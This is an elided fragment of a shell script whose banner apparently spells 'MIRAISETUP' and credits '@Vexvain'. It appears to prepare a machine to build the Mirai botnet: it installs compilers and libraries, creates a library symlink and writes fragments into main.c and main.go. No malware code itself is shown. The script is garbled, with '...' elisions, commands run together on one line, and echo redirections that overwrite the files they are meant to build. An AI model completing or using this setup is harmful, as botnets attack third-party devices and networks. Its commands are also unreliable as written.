...
clear 
echo -e " 
          ${RED}███${WHITE}╗ ${RED}███${WHITE}╗${RED}██${WHITE}╗${RED}██████${WHITE}╗ ${RED}█████${WHITE}╗ ${RED}██${WHITE}╗${RED}███████${WHITE}╗${RED}███████${WHITE}╗${RED}████████${WHITE}╗${RED}██${WHITE}╗ ${RED}██${WHITE}╗${RED}██████${WHITE}╗ ${RED}████${WHITE}╗ ${RED}████${WHITE}║${RED}██${WHITE}║${RED}██${WHITE}╔══${RED}██${WHITE}╗${RED}██${WHITE}╔══${RED}██${WHITE}╗${RED}██${WHITE}║${RED}██${WHITE}╔════╝${RED}██${WHITE}╔════╝╚══${RED}██${WHITE}╔══╝${RED}██${WHITE}║ ${RED}██${WHITE}║${RED}██${WHITE}╔══${RED}██${WHITE}╗ ${RED}██${WHITE}╔${RED}████${WHITE}╔${RED}██${WHITE}║${RED}██${WHITE}║${RED}██████${WHITE}╔╝${RED}███████${WHITE}║${RED}██${WHITE}║${RED}███████${WHITE}╗${RED}█████${WHITE}╗ ${RED}██${WHITE}║ ${RED}██${WHITE}║ ${RED}██${WHITE}║${RED}██████${WHITE}╔╝ ${RED}██${WHITE}║╚${RED}██${WHITE}╔╝${RED}██${WHITE}║${RED}██${WHITE}║${RED}██${WHITE}╔══${RED}██${WHITE}╗${RED}██${WHITE}╔══${RED}██${WHITE}║${RED}██${WHITE}║╚════${RED}██║${RED}██${WHITE}╔══╝ ${RED}██${WHITE}║ ${RED}██${WHITE}║ ${RED}██${WHITE}║${RED}██${WHITE}╔═══╝ ${RED}██${WHITE}║ ╚═╝ ${RED}██${WHITE}║${RED}██${WHITE}║${RED}██${WHITE}║ ${RED}██${WHITE}║${RED}██${WHITE}║ ${RED}██${WHITE}║${RED}██${WHITE}║${RED}███████${WHITE}║${RED}███████${WHITE}╗ ${RED}██${WHITE}║ ╚${RED}██████${WHITE}╔╝${RED}██${WHITE}║ ${WHITE}╚═╝ ╚═╝╚═╝╚═╝ ╚═╝╚═╝ ╚═╝╚═╝╚══════╝╚══════╝ ╚═╝ ╚═════╝ ╚═╝ 
" 
echo -e "${WHITE}Devs:${WHITE} [${LIGHTCYAN}@Vexvain${WHITE}]" 
...
yum install gmp-devel -y ln -s /usr/lib64/libgmp.so.3 /usr/lib64/libgmp.so.10 
yum install screen 
wget bzip2 gcc nano gcc-c++ electric-fence 
...
echo -e "#endif" > main.c echo -e " " > main.c 
...
echo -e " return " > main.go echo -e " } " > main.go 
echo -e " " > main.go 
